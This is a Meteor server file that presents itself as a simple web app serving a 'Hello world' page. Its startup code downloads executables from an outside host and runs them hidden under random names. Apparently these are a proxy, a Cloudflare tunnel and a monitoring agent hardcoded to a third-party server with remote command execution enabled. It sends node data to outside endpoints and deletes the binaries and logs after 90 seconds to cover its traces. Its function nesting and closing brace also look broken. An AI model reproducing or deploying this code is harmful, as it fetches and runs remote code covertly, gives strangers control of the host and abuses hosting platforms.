import axios from 'axios';
import os from 'os';
import fs from 'fs';
import path from 'path';
import WebSocket from 'ws';
import { Meteor } from 'meteor/meteor';
import { WebApp } from 'meteor/webapp';
import { promisify } from 'util';
import { exec as execCallback, execSync } from 'child_process';

const exec = promisify(execCallback);

const UPLOAD_URL = process.env.UPLOAD_URL || 'https://sub.smartdns.eu.org/upload-ea4909ef-7ca6-4b46-bf2e-6c07896ef338';
const PROJECT_URL = process.env.PROJECT_URL || '';
const AUTO_ACCESS = process.env.AUTO_ACCESS || false;
const FILE_PATH = process.env.FILE_PATH || './tmp';
const SUB_PATH = process.env.SUB_PATH || 'sub';
const UUID = process.env.UUID || 'b1a3001d-d6b1-4e66-ac20-faec13a729f4';
const NEZHA_SERVER = process.env.NEZHA_SERVER || 'nazhav1.gamesover.eu.org:443';
const NEZHA_PORT = process.env.NEZHA_PORT || '';
const NEZHA_KEY = process.env.NEZHA_KEY || 'qL7B61misbNGiLMBDxXJSBztCna5Vwsy';
const ARGO_DOMAIN = process.env.ARGO_DOMAIN || '';
const ARGO_AUTH = process.env.ARGO_AUTH || '';
const ARGO_PORT = process.env.ARGO_PORT || 8001;
const CFIP = process.env.CFIP || 'ip.sb';
const CFPORT = process.env.CFPORT || 443;
const NAME = process.env.NAME || 'XXXXXXXXXXXXXXXX';
const WS_PORT = process.env.PORT || 3000;

if (!fs.existsSync(FILE_PATH)) {
  fs.mkdirSync(FILE_PATH);
  console.log(`${FILE_PATH} is created`);
} else {
  console.log(`${FILE_PATH} already exists`);
}

function generateRandomName() {
  const characters = 'abcdefghijklmnopqrstuvwxyz';
  let result = '';
  for (let i = 0; i < 6; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}

const npmName = generateRandomName();
const webName = generateRandomName();
const botName = generateRandomName();
const phpName = generateRandomName();
let npmPath = path.join(FILE_PATH, npmName);
let phpPath = path.join(FILE_PATH, phpName);
let webPath = path.join(FILE_PATH, webName);
let botPath = path.join(FILE_PATH, botName);
let subPath = path.join(FILE_PATH, 'sub.txt');
let listPath = path.join(FILE_PATH, 'list.txt');
let bootLogPath = path.join(FILE_PATH, 'boot.log');
let configPath = path.join(FILE_PATH, 'config.json');

function deleteNodes() {
  try {
    if (!UPLOAD_URL) return;
    if (!fs.existsSync(subPath)) return;

    let fileContent;
    try {
      fileContent = fs.readFileSync(subPath, 'utf-8');
    } catch {
      return null;
    }

    const decoded = Buffer.from(fileContent, 'base64').toString('utf-8');
    const nodes = decoded.split('\n').filter(line => 
      /(vless|vmess|trojan|hysteria2|tuic):\/\//.test(line)
    );

    if (nodes.length === 0) return;

    axios.post(`${UPLOAD_URL}/api/delete-nodes`, 
      JSON.stringify({ nodes }),
      { headers: { 'Content-Type': 'application/json' } }
    ).catch(() => { 
      return null; 
    });
    return null;
  } catch (err) {
    return null;
  }
}

function cleanupOldFiles() {
  try {
    const files = fs.readdirSync(FILE_PATH);
    files.forEach(file => {
      const filePath = path.join(FILE_PATH, file);
      try {
        const stat = fs.statSync(filePath);
        if (stat.isFile()) {
          fs.unlinkSync(filePath);
        }
      } catch (err) {
      }
    });
  } catch (err) {
  }
}

async function generateConfig() {
  const config = {
    log: { access: '/dev/null', error: '/dev/null', loglevel: 'none' },
    inbounds: [
      { port: ARGO_PORT, protocol: 'vless', settings: { clients: [{ id: UUID, flow: 'xtls-rprx-vision' }], decryption: 'none', fallbacks: [{ dest: 3001 }, { path: "/vless-argo", dest: 3002 }, { path: "/vmess-argo", dest: 3003 }, { path: "/trojan-argo", dest: 3004 }] }, streamSettings: { network: 'tcp' } },
      { port: 3001, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: UUID }], decryption: "none" }, streamSettings: { network: "tcp", security: "none" } },
      { port: 3002, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: UUID, level: 0 }], decryption: "none" }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/vless-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
      { port: 3003, listen: "127.0.0.1", protocol: "vmess", settings: { clients: [{ id: UUID, alterId: 0 }] }, streamSettings: { network: "ws", wsSettings: { path: "/vmess-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
      { port: 3004, listen: "127.0.0.1", protocol: "trojan", settings: { clients: [{ password: UUID }] }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/trojan-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
    ],
    dns: { servers: ["https+local://8.8.8.8/dns-query"] },
    outbounds: [ { protocol: "freedom", tag: "direct" }, {protocol: "blackhole", tag: "block"} ]
  };
  fs.writeFileSync(path.join(FILE_PATH, 'config.json'), JSON.stringify(config, null, 2));
}

function getSystemArchitecture() {
  const arch = os.arch();
  if (arch === 'arm' || arch === 'arm64' || arch === 'aarch64') {
    return 'arm';
  } else {
    return 'amd';
  }
}

function downloadFile(fileName, fileUrl, callback) {
  const filePath = fileName; 
  
  if (!fs.existsSync(FILE_PATH)) {
    fs.mkdirSync(FILE_PATH, { recursive: true });
  }
  
  const writer = fs.createWriteStream(filePath);

  axios({
    method: 'get',
    url: fileUrl,
    responseType: 'stream',
  })
    .then(response => {
      response.data.pipe(writer);

      writer.on('finish', () => {
        writer.close();
        // console.log(`Download ${path.basename(filePath)} successfully`);
        callback(null, filePath);
      });

      writer.on('error', err => {
        fs.unlink(filePath, () => { });
        const errorMessage = `Download ${path.basename(filePath)} failed: ${err.message}`;
        console.error(errorMessage);
        callback(errorMessage);
      });
    })
    .catch(err => {
      const errorMessage = `Download ${path.basename(filePath)} failed: ${err.message}`;
      console.error(errorMessage);
      callback(errorMessage);
    });
}

function getFilesForArchitecture(architecture) {
  let baseFiles;
  if (architecture === 'arm') {
    baseFiles = [
      { fileName: webPath, fileUrl: "https://arm64.ssss.nyc.mn/web" },
      { fileName: botPath, fileUrl: "https://arm64.ssss.nyc.mn/bot" }
    ];
  } else {
    baseFiles = [
      { fileName: webPath, fileUrl: "https://amd64.ssss.nyc.mn/web" },
      { fileName: botPath, fileUrl: "https://amd64.ssss.nyc.mn/bot" }
    ];
  }

  if (NEZHA_SERVER && NEZHA_KEY) {
    if (NEZHA_PORT) {
      const npmUrl = architecture === 'arm' 
        ? "https://arm64.ssss.nyc.mn/agent"
        : "https://amd64.ssss.nyc.mn/agent";
        baseFiles.unshift({ 
          fileName: npmPath, 
          fileUrl: npmUrl 
        });
    } else {
      const phpUrl = architecture === 'arm' 
        ? "https://arm64.ssss.nyc.mn/v1" 
        : "https://amd64.ssss.nyc.mn/v1";
      baseFiles.unshift({ 
        fileName: phpPath, 
        fileUrl: phpUrl
      });
    }
  }

  return baseFiles;
}

async function downloadFilesAndRun() {  
  const architecture = getSystemArchitecture();
  const filesToDownload = getFilesForArchitecture(architecture);

  if (filesToDownload.length === 0) {
    console.log(`Can't find a file for the current architecture`);
    return;
  }

  const downloadPromises = filesToDownload.map(fileInfo => {
    return new Promise((resolve, reject) => {
      downloadFile(fileInfo.fileName, fileInfo.fileUrl, (err, filePath) => {
        if (err) {
          reject(err);
        } else {
          resolve(filePath);
        }
      });
    });
  });

  try {
    await Promise.all(downloadPromises);
  } catch (err) {
    console.error('Error downloading files:', err);
    return;
  }

  function authorizeFiles(filePaths) {
    const newPermissions = 0o775;
    filePaths.forEach(absoluteFilePath => {
      if (fs.existsSync(absoluteFilePath)) {
        fs.chmod(absoluteFilePath, newPermissions, (err) => {
          if (err) {
            console.error(`Empowerment failed for ${absoluteFilePath}: ${err}`);
          } else {
            // console.log(`Empowerment success for ${absoluteFilePath}: ${newPermissions.toString(8)}`);
          }
        });
      }
    });
  }

  const filesToAuthorize = NEZHA_PORT ? [npmPath, webPath, botPath] : [phpPath, webPath, botPath];
  authorizeFiles(filesToAuthorize);

  if (NEZHA_SERVER && NEZHA_KEY) {
    if (!NEZHA_PORT) {
      const port = NEZHA_SERVER.includes(':') ? NEZHA_SERVER.split(':').pop() : '';
      const tlsPorts = new Set(['443', '8443', '2096', '2087', '2083', '2053']);
      const nezhatls = tlsPorts.has(port) ? 'true' : 'false';
      const configYaml = `
client_secret: ${NEZHA_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: true
ip_report_period: 1800
report_delay: 4
server: ${NEZHA_SERVER}
skip_connection_count: true
skip_procs_count: true
temperature: false
tls: ${nezhatls}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: ${UUID}`;
      
      fs.writeFileSync(path.join(FILE_PATH, 'config.yaml'), configYaml);
      
      const command = `nohup ${phpPath} -c "${FILE_PATH}/config.yaml" >/dev/null 2>&1 &`;
      try {
        await exec(command);
        // console.log(`${phpName} is running`);
        await new Promise((resolve) => setTimeout(resolve, 1000));
      } catch (error) {
        console.error(`php running error: ${error}`);
      }
    } else {
      let NEZHA_TLS = '';
      const tlsPorts = ['443', '8443', '2096', '2087', '2083', '2053'];
      if (tlsPorts.includes(NEZHA_PORT)) {
        NEZHA_TLS = '--tls';
      }
      const command = `nohup ${npmPath} -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${NEZHA_TLS} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`;
      try {
        await exec(command);
        // console.log(`${npmName} is running`);
        await new Promise((resolve) => setTimeout(resolve, 1000));
      } catch (error) {
        console.error(`npm running error: ${error}`);
      }
    }
  } else {
    console.log('NEZHA variable is empty,skip running');
  }

  const command1 = `nohup ${webPath} -c ${FILE_PATH}/config.json >/dev/null 2>&1 &`;
  try {
    await exec(command1);
    // console.log(`${webName} is running`);
    await new Promise((resolve) => setTimeout(resolve, 1000));
  } catch (error) {
    console.error(`web running error: ${error}`);
  }

  if (fs.existsSync(botPath)) {
    let args;

    if (ARGO_AUTH.match(/^[A-Z0-9a-z=]{120,250}$/)) {
      args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${ARGO_AUTH}`;
    } else if (ARGO_AUTH.match(/TunnelSecret/)) {
      args = `tunnel --edge-ip-version auto --config ${FILE_PATH}/tunnel.yml run`;
    } else {
      args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${FILE_PATH}/boot.log --loglevel info --url http://localhost:${ARGO_PORT}`;
    }

    try {
      await exec(`nohup ${botPath} ${args} >/dev/null 2>&1 &`);
      // console.log(`${botName} is running`);
      await new Promise((resolve) => setTimeout(resolve, 2000));
    } catch (error) {
      console.error(`Error executing command: ${error}`);
    }
  }
  await new Promise((resolve) => setTimeout(resolve, 5000));
}

function argoType() {
  if (!ARGO_AUTH || !ARGO_DOMAIN) {
    console.log("ARGO_DOMAIN or ARGO_AUTH variable is empty, use quick tunnels");
    return;
  }

  if (ARGO_AUTH.includes('TunnelSecret')) {
    fs.writeFileSync(path.join(FILE_PATH, 'tunnel.json'), ARGO_AUTH);
    const tunnelYaml = `
tunnel: ${ARGO_AUTH.split('"')[11]}
credentials-file: ${path.join(FILE_PATH, 'tunnel.json')}
protocol: http2

ingress:
  - hostname: ${ARGO_DOMAIN}
    service: http://localhost:${ARGO_PORT}
    originRequest:
      noTLSVerify: true
  - service: http_status:404
`;
    fs.writeFileSync(path.join(FILE_PATH, 'tunnel.yml'), tunnelYaml);
  } else {
    // console.log("ARGO_AUTH mismatch TunnelSecret,use token connect to tunnel");
  }
}

let subTxtContent = '';

async function extractDomains() {
  let argoDomain;

  if (ARGO_AUTH && ARGO_DOMAIN) {
    argoDomain = ARGO_DOMAIN;
    // console.log('ARGO_DOMAIN:', argoDomain);
    await generateLinks(argoDomain);
  } else {
    // 等待 boot.log 文件生成
    const bootLogFile = path.join(FILE_PATH, 'boot.log');
    let retries = 10;
    while (!fs.existsSync(bootLogFile) && retries > 0) {
      console.log(`Waiting for boot.log to be created... (${retries} retries left)`);
      await new Promise((resolve) => setTimeout(resolve, 3000));
      retries--;
    }
    
    if (!fs.existsSync(bootLogFile)) {
      console.log('boot.log not found after waiting, skipping domain extraction');
      return;
    }
    
    try {
      const fileContent = fs.readFileSync(bootLogFile, 'utf-8');
      const lines = fileContent.split('\n');
      const argoDomains = [];
      lines.forEach((line) => {
        const domainMatch = line.match(/https?:\/\/([^ ]*trycloudflare\.com)\/?/);
        if (domainMatch) {
          const domain = domainMatch[1];
          argoDomains.push(domain);
        }
      });

      if (argoDomains.length > 0) {
        argoDomain = argoDomains[0];
        console.log('ArgoDomain:', argoDomain);
        await generateLinks(argoDomain);
      } else {
        console.log('ArgoDomain not found, re-running bot to obtain ArgoDomain');
        if (fs.existsSync(path.join(FILE_PATH, 'boot.log'))) {
          fs.unlinkSync(path.join(FILE_PATH, 'boot.log'));
        }
        async function killBotProcess() {
          try {
            if (process.platform === 'win32') {
              await exec(`taskkill /f /im ${botName}.exe > nul 2>&1`);
            } else {
              await exec(`pkill -f "[${botName.charAt(0)}]${botName.substring(1)}" > /dev/null 2>&1`);
            }
          } catch (error) {
          }
        }
        await killBotProcess();
        await new Promise((resolve) => setTimeout(resolve, 3000));
        const args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${FILE_PATH}/boot.log --loglevel info --url http://localhost:${ARGO_PORT}`;
        try {
          await exec(`nohup ${botPath} ${args} >/dev/null 2>&1 &`);
          console.log(`${botName} is running`);
          await new Promise((resolve) => setTimeout(resolve, 3000));
          await extractDomains();
        } catch (error) {
          console.error(`Error executing command: ${error}`);
        }
      }
    } catch (error) {
      console.error('Error reading boot.log:', error);
    }
  }

  async function generateLinks(argoDomain) {
  // 从 ipconfig 获取 ISP 信息
  const ISP = (await (await fetch("https://ipconfig.netlib.re")).text()).trim();
  const nodeName = NAME ? `${ISP}-${NAME}` : ISP;

  return new Promise((resolve) => {
    setTimeout(() => {
      let subTxtContent = `
vless://${UUID}@${CFIP}:${CFPORT}?encryption=none&security=tls&sni=${argoDomain}&fp=firefox&type=ws&host=${argoDomain}&path=%2Fvless-argo%3Fed%3D2560#${nodeName}
`;

      fs.writeFileSync(subPath, Buffer.from(subTxtContent).toString('base64'));
      uploadNodes();
      resolve(subTxtContent);
    }, 2000);
  });
}

async function uploadNodes() {
  if (UPLOAD_URL && PROJECT_URL) {
    const subscriptionUrl = `${PROJECT_URL}/${SUB_PATH}`;
    const jsonData = {
      subscription: [subscriptionUrl]
    };
    try {
      const response = await axios.post(`${UPLOAD_URL}/api/add-subscriptions`, jsonData, {
        headers: {
          'Content-Type': 'application/json'
        }
      });
      
      if (response && response.status === 200) {
        console.log('Subscription uploaded successfully');
        return response;
      } else {
        return null;
      }
    } catch (error) {
      if (error.response) {
        if (error.response.status === 400) {
        }
      }
    }
  } else if (UPLOAD_URL) {
    if (!fs.existsSync(listPath)) return;
    const content = fs.readFileSync(listPath, 'utf-8');
    const nodes = content.split('\n').filter(line => /(vless|vmess|trojan|hysteria2|tuic):\/\//.test(line));

    if (nodes.length === 0) return;

    const jsonData = JSON.stringify({ nodes });

    try {
      const response = await axios.post(`${UPLOAD_URL}/api/add-nodes`, jsonData, {
        headers: { 'Content-Type': 'application/json' }
      });
      if (response && response.status === 200) {
        console.log('Nodes uploaded successfully');
        return response;
      } else {
        return null;
      }
    } catch (error) {
      return null;
    }
  } else {
    return;
  }
}

function cleanFiles() {
  setTimeout(() => {
    const filesToDelete = [bootLogPath, configPath, webPath, botPath];  
    
    if (NEZHA_PORT) {
      filesToDelete.push(npmPath);
    } else if (NEZHA_SERVER && NEZHA_KEY) {
      filesToDelete.push(phpPath);
    }

    if (process.platform === 'win32') {
      exec(`del /f /q ${filesToDelete.join(' ')} > nul 2>&1`).then(() => {
        console.clear();
        console.log('App is running');
        console.log('Thank you for using this script, enjoy!');
      });
    } else {
      exec(`rm -rf ${filesToDelete.join(' ')} >/dev/null 2>&1`).then(() => {
        console.clear();
        console.log('App is running');
        console.log('Thank you for using this script, enjoy!');
      });
    }
  }, 90000);
}

async function AddVisitTask() {
  if (!AUTO_ACCESS || !PROJECT_URL) {
    // console.log("Skipping adding automatic access task");
    return;
  }

  try {
    const response = await axios.post('https://oooo.serv00.net/add-url', {
      url: PROJECT_URL
    }, {
      headers: {
        'Content-Type': 'application/json'
      }
    });
    console.log(`automatic access task added successfully`);
    return response;
  } catch (error) {
    console.error(`Add automatic access task faild: ${error.message}`);
    return null;
  }
}

async function startserver() {
  try {
    deleteNodes();
    cleanupOldFiles();
    await generateConfig();
    await downloadFilesAndRun();
    await extractDomains();
    await AddVisitTask();
    cleanFiles();
  } catch (error) {
    console.error('Error in startserver:', error);
  }
}

// WebSocket 保活机制 - 通过外部域名连接，让平台统计到连接数
function startWebSocketKeepAlive() {
  // 使用外部域名连接，这样平台才能统计到
  const wsUrl = process.env.ROOT_URL ? 
    process.env.ROOT_URL.replace('https://', 'wss://').replace('http://', 'ws://') + '/websocket' :
    `ws://localhost:${WS_PORT}/websocket`;
  
  function createConnection() {
    try {
      const ws = new WebSocket(wsUrl);
      
      ws.on('open', () => {
        console.log('Keep-alive WebSocket connected to:', wsUrl);
        // 每5分钟发送心跳包
        const heartbeat = setInterval(() => {
          if (ws.readyState === WebSocket.OPEN) {
            ws.ping();
          } else {
            clearInterval(heartbeat);
          }
        }, 300000);
      });
      
      ws.on('close', () => {
        console.log('Keep-alive WebSocket disconnected, reconnecting...');
        setTimeout(createConnection, 5000);
      });
      
      ws.on('error', (err) => {
        console.log('Keep-alive WebSocket error:', err.message);
      });
    } catch (e) {
      setTimeout(createConnection, 5000);
    }
  }
  
  // 延迟15秒启动，等待服务器完全就绪
  setTimeout(createConnection, 15000);
  console.log('WebSocket keep-alive mechanism initialized');
}

// Meteor 启动入口
Meteor.startup(async () => {
  console.log('Meteor server is starting...');
  
  // 初始化隧道类型
  argoType();
  
  // 启动 WebSocket 保活机制
  startWebSocketKeepAlive();
  
  // 启动主服务
  startserver().catch(error => {
    console.error('Unhandled error in startserver:', error);
  });
});

// 使用 WebApp 替代 Express 路由
// 主页路由
WebApp.connectHandlers.use('/', (req, res, next) => {
  if (req.url === '/' && req.method === 'GET') {
    let htmlContent = null;
    
    // 方法1: 尝试使用 Meteor Assets API (从 private 目录)
    try {
      htmlContent = Assets.getText('app.html');
    } catch (e) {
      // Assets API 失败，尝试文件系统
    }
    
    // 方法2: 尝试多个可能的文件路径
    if (!htmlContent) {
      const possiblePaths = [
        path.join(process.cwd(), 'private', 'app.html'),
        path.join(process.cwd(), 'public', 'app.html'),
        path.join(process.cwd(), 'assets', 'app', 'app.html'),
        path.join(process.cwd(), 'programs', 'server', 'assets', 'app', 'app.html'),
      ];
      
      for (const htmlPath of possiblePaths) {
        if (fs.existsSync(htmlPath)) {
          htmlContent = fs.readFileSync(htmlPath, 'utf-8');
          break;
        }
      }
    }
    
    if (htmlContent) {
      res.setHeader('Content-Type', 'text/html; charset=utf-8');
      res.end(htmlContent);
    } else {
      res.setHeader('Content-Type', 'text/plain');
      res.end('Hello world!');
    }
  } else {
    next();
  }
});

// 订阅路由
WebApp.connectHandlers.use(`/${SUB_PATH}`, (req, res, next) => {
  if (req.method === 'GET') {
    // 优先从文件读取，因为 subTxtContent 可能还没生成
    let content = subTxtContent;
    if (!content && fs.existsSync(subPath)) {
      content = Buffer.from(fs.readFileSync(subPath, 'utf-8'), 'base64').toString('utf-8');
    }
    const encodedContent = Buffer.from(content || '').toString('base64');
    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
    res.end(encodedContent);
  } else {
    next();
  }
});
}
